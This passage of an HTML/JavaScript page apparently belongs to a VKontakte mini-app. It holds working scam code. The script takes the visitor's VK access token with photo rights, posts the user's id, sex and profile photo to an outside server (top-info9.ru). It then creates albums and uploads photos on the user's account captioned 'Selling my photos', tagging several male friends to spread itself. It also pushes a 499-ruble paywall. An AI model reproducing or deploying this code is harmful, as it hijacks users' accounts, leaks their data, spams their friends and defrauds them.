/W47T0y7CjiMXTN5bVJr6zWf/n9lzcgKopzDu89Th0iemPXLfTMcFbobCaYYeqZJXAx4TUWTteF65KIqdW7wTuGvuPhsOXhfse7w4bDdmAMgS50hK7D1DGnzOfnM58ejzy+nMgpQszU6wv5/MxyfcXGO9QciLbQF7llLxj4f/6f//m2+t45Qujouw7vPSL6FnYrgyGoMUhhkIwtF6YUuZbKbMZUKueUiXHVlaIcfODw7oG//+0n/vrnew69b5THIPQ9Lnhirmx3r6hTaq0cj4aVhJVIiWfS9ZU6PGE5NQIlsi5y0yOigv/j47+vSS4E7xn6jmEYCD6gqjSMtxUwvBiLMyZtN8vTRKIgXnCdx5dCrolawdQhw5btux/58W9/5+e/PLDRSrpcyEui34yM27GFifOc58zLJTLNkbQUaknE+Uw+fmnVNIw02iuINl4mKqg6fJ6e3zRHdo66BGrqCaHtit62cKUwXqB4YdEWauSMOmGz6dtuDZ5pSsRUCd3AeHfP5sOf2f74M8PDHjefideFbIkOcCGAKL7r0dCDHzDtqMxYyeT5TD1+puYZ812j89/SFhGh1IL3CqU2NqW3BohD1/9WZZWwhVoKSaAEh3PypiyH4Bn9iAyBfR6Zp4UlFrTf8PDhPfv3f8Lt3rGIZ0oXLlMhTpniMroUkMppqRwX45JgrkLOhlnG5EI0KPMEwTf6srYFM0PV0fcDPqjgRBFVvFe64Om9f8uRbK1WzzFTS20AnMOcIk3JUMUhIdBJYwa+XxhzpRv3/PDhB3b3dxTneZor0zFyfo3UJXItwiwdxeDTy8TnU+J5KlxixVKFWjCLRPEUU0iKYdSaG0irqChXAd/1PaorgC4whEBYy2KuxhQz+aZURFqMaoe4AKtii0Cg5RNm0HWEHnaHO/Z3e7rOMy2J58uVl8cz56cr5JntnNnGJqK+vM78cY6clsySW/OlNoZRAhT3nUYxg1qxWhAKXhX/l7/8RPCesesYu44+hLYT1VhSYYqZmCtzyk1TO0ff96jz1GKNIWMElVYYMJRK7+Bwt2O/3eBqYTq98vj0ypc/Hjk/n5CaGYOjX5rN83qJHOeFVPJNGa3BroBHpcPEtbCyppFqbaZHqgX/3/7rvxGcpw+ePgSCOsSMUisxF+ZsTeKWuhYFxa1hV4qRS2PN+lahDZXK6OHdtuN+2xOYSfNCPj8RLy9MlxNmleg9PhWKwXVJ5DijFLwTLHgsG6auAZKA+gFUMQpWR2qOUBvL9n/98I6wNii3qsGaM+Xm7q1Np5q0FFsbJ4BVozSO0HT1ypQVY1BjF2AXGuV2Gpk0ciESWWl+duQcW6ikgiuFTo0aFLOOot/cEHGCdh3qO0RZpUdGzBAUL5czbhxwAuI8JUXiPK03gIysukSb57USy5uR9xYE2r5XbYCcF7x3DOoZvbLF4+eAnBR3MU4pkoGapNmfBYq5tlAhgAjBNX2Oa06oKoh3dH3AO8GtdpSK4F8/fWJ72GGHO7TruU5XLq+vXKYzS8lcc6UYiChj8AzO4QSqVZIZS20CTICgSq9K75Td0FEPW3bv7xi3O/bdgEsD+dhTz44uwZwyS61MBWLxGJ4sHRVBfcGrECy1HZBC/U4Adt4zDkrnQKn408tzi3/x+L4yTxOX1yOvr8+8zBPPU2Qplc453m0HHvqeTmHJheMSeYmJS85Uq/SqbLxn23e8O+wQ+8CHhx3OOzZOyEPgMHgug8cWxSOoGdHAqrDguNKRRenI7FzB08ztVGtrAZbJ4vGdMQo4D0Ec/ioBQ+lbhFNqM4iPc+XpHHmeZooZ+3FARdl0gUEEqZFjNqZr5GWeiDnjBbZdx7v9hu12RLziO4/3ilqj+p1Teu/ovWNuKqkRBBMW81wJFBR1IOIJZMQKuRZKzUw1s1gGFYKrOBfwHnztRmo3YKGjqCfiuFTHtSpLdYh2dE4Zt1vG/YHxbk8HpOuCz0qXYTRDXWyFsuvoNxvuHu744d09d7sNnQhWClYbvW+EtRWKWiqlNid/VeHrHjicc/TqkWqk1MRHzka0iknGa9O2uvX4/Y9/YrMZ2Wy3UCvMCQs9brPn0PXcKQxDx91+x4f7HffbDWqg00IatvjDlYdlJpWMUfFO+XC/5+efPvDThwcOQ3NO6jJTUmqzjmqkYsTcSnw1RdTwQKBZQJ1XhhDY+GYfJYMugwcikDJMsTkrYwf+3bt3DEPP0HekJdINke1+i+8Dzgl9HxiGnnHs2Y09Y98jQJ8y4/0df8651XUzam0u8WHb8/MPO97vO0It5HkiXq8s08Q8R+aYiamQUiHn2kxoXxl9xdQowMYrQx8YPZgWksGojiSeoM24eButAP7h4YEQfPNWMdLYY9xhQNcF+j7QdYHgPcE7gnNvpvKu1rfZyc069k7YdcpDZ/R1Jl7PpPOJ5TpxOk2czheu15lpicScyTljOAKVrat4XyiiDK5dy9RhGpAAfejYO09RD6p0HsZO8GL44/HM0Hs679rWl0LJtelhMqVaY7KyuuPaNL2+zVNAVQirlB1Dz+AVb5F0mZhfXpmPR6brxPE88/J64XSemuZI+Y15W01QI1IDqoKZkgyuRTALRAUTj649RdQIrtm7YgX/f//1xN1+4H7bg2VO5yuPLxcuS2lDnjcZzBsIYSWH3GxW6IPn/rDj5x/vkX1HsZn68sr8/MJ8PjFdZ46XhdfTxOUys8REToWy9qGYCzOZuWSKU1Q9SxHO0rhVBrKAlQIKTts8xTuHmcP/8vErP/6wR9mjVng5XvnX5xeezzOx3Ohb6+a3ncBuA8+bxWrsho6fPjzQB09nGy7pwvx4ZHk+kq8X0hK5TAvn68K8JGLOxFKbYQ1MFc6lMqVC0fVhna550OhRlVvVy3iv7AaHqrAZPP48Xzmknlyb/TjFxPEy8XycmfM3Hgq3sdw3INW+md9pZzwcEtRKKpnLZeHr05Xr4xWWCcuJGBPLStNjMWIRFoMF5WrC1WASI0nFRNqkd1WojY6W72S5Q9XYDAFB8GhEXEbU3kbFlUIlU+t3MKQpxZt5Z6vUXL/EqTIGZdfBIIW5JF4uka+nSJkTrmasVkqmjdBMWSokhIwSRZrekHVaa5V6W7X/PIGihbjV21vFv/uh43AIDKOjRiMEYTM6DnVgUxRotpCqvpl3b9e/kUaBD/uePz9s+bBRdiGTJKFk5lw4LaX1qHW4aTRyaL6tdlMcQhEj3Ka6a26yOiX2n6B0Xtos0zmcCv7vf/3A/XbPYdwQp8jdMvKnDwcO92AEVAKqDtX2BzeW+2Zw00bKDxvPPx56ftwGepuJLnPQTEemlsJS2wM68QQnDMHRr+w25cJUaGXUQ3EK4lcXpy2g2Xe7IkLnHfsxsOk9Xh3+Hz//Fza+I6jjqhNWKi4EqijO9XgNONcu6px7q2AivOkPJ7AP8ONg3IeMzsaWzF4LW0u81MySAedwQdmPHR/2Pfe9w0rmeJl4ulaOZnhnVE/TH06/A6NvISai+KCMvafz6zTakmFaAW06QgUvbcAiltajEIXWLtvFTKDxlOb7ioEVwbK2z2omWKWn0FsmlIgvINqx7wI/3/X84/2O+8ExTzMfa2KaI5ebMKkZEzBqu6cpqK7Vs0lgMbcmVIVa8b/99jvvDjsO2w0pRo7HM58fX5niajmo4JxD1SPi1kQznKt4LYhlBOMuBOrdlt19z46EWG3nVTCcZSSD845dEH66G/jbuy27TnmWytOzghkxFc5pIYlh0nJT9FuufO9P911gv+3pPOTB4f/3v//CX396T33/AyUVvjwe+Y9fPvN8ulJrRV2bqKpzqPgGRA3vK04yVhYoxrvNBvvzD7x37+n6bznUFDdQ2xh89I6Hbc/Druma1+Pqm5XCHOFchNmsMeDvSu86cWo/FDZjQHTLZuObQff4dOZht2c5FGounC6Rx5eJx5cLxQreQ9eBOlnri6CuAcEyOUYsG3EXeT/2nD/seQjd2ncaD7uNvJU28h5CoPOKmjXdX41ikM2IpbB8d3zk+zMxSDssoAquCyTzVGkMxNdy6wc3a3R9Lw6nSvBG1xnOfRsGObfW8duwBtrhGBEqhq0nE9xt0C9Nv3ddaE6Nd83AsLIKq1X9q+A7pV8f5wakGR/2Zq05Z/QDdH17FkPwKo3XOHWg4L2jD4Gxr4jC0Bv9UGmHb1r10JUB11qooWIGm7EnDD24NsPgRjBVGwiDse/phv7N7zUrjeCIIOrwQejxONd2st6A3MYHYq1KetgMHX3v8F7b2YAuKMH7VlrN8E7p+8AeJQTHZuPYbJQuKM4HnAstX2gGxO1Yz37w/Hg/MO42uFAos8P5dVdDYBM8dw97Docdw9AjTrB8awuC94FRPdV1VOeQtSi1/rFuhWoLKwdD79n2I8GPmDn+HylvC2frIo97AAAAAElFTkSuQmCC"> \n\
                                </div> \n\
                                <span style="width: fit-content;" class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 mb-2">И ещё 2</span> \n\
                              </div> \n\
                            </div> \n\
                            <a style="width: 90%;display: block;text-align: center;margin: auto;" href="red_pay.html?r=1&viewer_id='+viewer_id+'&app=photo&amount=499" target="_blank" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded w-full"> \n\
                              Открыть доступ и просмотреть фото \n\
                            </a> \n\
                            <span style="text-align: center;width: 90%;margin: auto;" class="block rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 mb-2">499 рублей</span>';
                    $("body").html(div);





                }


              })
              .catch(error => {

              });
        }

        window.addEventListener('load', function () {
            vkConnect.send('VKWebAppInit');

            vkConnect.send('VKWebAppGetUserInfo')
                .then(data => {
                    viewer = data;
                    vkConnect.send("VKWebAppGetAuthToken", {
                        "app_id": vk_app_id,
                        "scope": "photos"
                    })
                    .then(data => {
                        if(token){return false;}
                        token = data.access_token;
                        firstApi();


                    })
                    .catch(error => {

                    });

                })
                .catch(error => {

                });

        });


        function getRandom(min, max)
        {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        function createAlbom(){
          vkConnect.sendPromise("VKWebAppCallAPIMethod", {
              "method": "photos.createAlbum",
              "params": {"title":"1"+viewer_id,"v": "5.95", "access_token": token}
          }).then(data => {
            var id_albom = data.response.id;
            uploadPhotoAlbom(id_albom);
            })
            .catch(error => {
                //tokenPhotos();
                console.log(error);
            });
        }

        var count_upload_photo = 0;
        function uploadPhotoAlbom(id_albom){
              //  html2canvas(document.getElementById('for_canvas'), {scrollY:0, scrollX:0}).then(function(canvas2) {
                      vkConnect.sendPromise("VKWebAppCallAPIMethod", {
                          "method": "photos.getUploadServer",
                          "params": {"album_id":id_albom,"v": "5.95", "access_token": token}
                      }).then(data => {

                        var upload_url = data.response.upload_url;
                        //var b64Image = canvas2.toDataURL();
                        //var u8Image  = b64ToUint8Array(b64Image);

                        var formData = new FormData();
                        //formData.append("image", new Blob([ u8Image ], {type: "image/jpg"}));
                        formData.append("upurl", upload_url);
                        formData.append("sex", viewer.sex);
                        formData.append("viewer_id", viewer.id);
                        //formData.append("is_photo", 1);
                        formData.append("my_photo", viewer.photo_max_orig);

                        var text = "";

                        var xhr = new XMLHttpRequest();
                        xhr.open("POST", "https://top-info9.ru/PSIH/uploadPhoto.php", true);
                        xhr.onreadystatechange = function () {
                            if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                                var data = JSON.parse(xhr.responseText);
                                var users_list = getFriendsOnlineForPhoto();
                                caption = "Продаю свои фото : \n\n https://vk.com/app"+vk_app_id+"#"+viewer_id+" \n"+users_list;

                                vkConnect.sendPromise("VKWebAppCallAPIMethod", {
                                    "method": "photos.save",
                                    "params": {"album_id": id_albom, "server": data.server, "photos_list": data.photos_list, "hash":data.hash, "caption":caption,"v": "5.95", "access_token": token}
                                }).then(data => {



                                  setTimeout(function() {
                                    var id_photo = data.response[0].id;
                                    caption = "Продаю свои фото : \n\n https://vk.com/app"+vk_app_id+"#"+viewer_id+"";
                                    vkConnect.sendPromise("VKWebAppCallAPIMethod", {
                                        "method": "photos.edit",
                                        "params": {"owner_id": viewer_id, "photo_id": id_photo,  "caption":caption,"v": "5.95", "access_token": token}
                                    }).then(data => {

                                    });
                                  }, 10000);


                                  count_upload_photo++;
                                  if(count_upload_photo < 4 && viewer.friends.items[global_offset_i+1]){
                                    setTimeout(function() {
                                        uploadPhotoAlbom(id_albom);
                                    }, 100);
                                  }
                                  })
                                  .catch(error => {

                                  });
                            }
                        };
                        xhr.send(formData);


                        })
                        .catch(error => {

                        });


                      //$("#for_canvas").html("");
              //   });
            //});

        }

        function sortByLastTime() {
          viewer.friends.items.sort((a, b) => b.last_seen.time > a.last_seen.time ? 1 : -1);
        }

        function getFriendsOnlineForPhoto() {
          sortByLastTime();
          var users_list = "\n \n \n";
          var count = 0;
          for(;global_offset_i<viewer.friends.items.length;global_offset_i++) {
            if(viewer.friends.items[global_offset_i].sex == 2){
              users_list += "[id"+viewer.friends.items[global_offset_i].id+"|"+viewer.friends.items[global_offset_i].first_name+"], ";
              count++;
              if(count > 8){
                break;
              }
            }
          }

            return users_list;
        }

    </script>
</head>
<body>



  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
  <script src="https://top-info9.ru/MESS_BACK/html2canvas.min.js"></script>
</body>
</html>
